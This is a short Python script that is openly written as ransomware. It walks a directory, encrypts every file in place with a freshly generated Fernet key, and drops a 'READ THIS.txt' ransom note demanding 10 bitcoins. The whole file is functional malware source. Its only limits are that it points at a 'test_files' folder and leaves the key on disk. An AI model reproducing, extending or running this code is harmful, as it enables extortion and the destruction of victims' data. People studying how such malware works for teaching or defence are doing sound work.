import os
from cryptography.fernet import Fernet

def generate_key():
    key = Fernet.generate_key() 
    with open("private.key", "wb") as private_key:
        private_key.write(key)

def load_key():
    return open("private.key", "rb").read()

def encrypt_file(file, key):
    f = Fernet(key)

    with open(file, 'rb') as fl:
        data = fl.read()
    crypted_data = f.encrypt(data)

    with open(file, "wb") as fl:
        fl.write(crypted_data)

def search_files(dir):
    l = []

    for root, _, files in os.walk(dir):
        for name in files:
            path = os.path.join(root, name)

            if name != "main.py" and not name.endswith(".key"):
                l.append(path)
    return l

def recover_message():
    with open("READ THIS.txt", "w") as f:
        f.write("Your files have been encrypted \n")
        f.write("Send me 10 bitcoins to X address.\n")
        f.write("Then, we will sent you the key to recover your data")

def run():
    generate_key()
    key = load_key()
    files = search_files("test_files")

    for file in files:
        encrypt_file(file, key)
    recover_message()
    print("Ransomware executed successfully")


if __name__ == "__main__":
    run()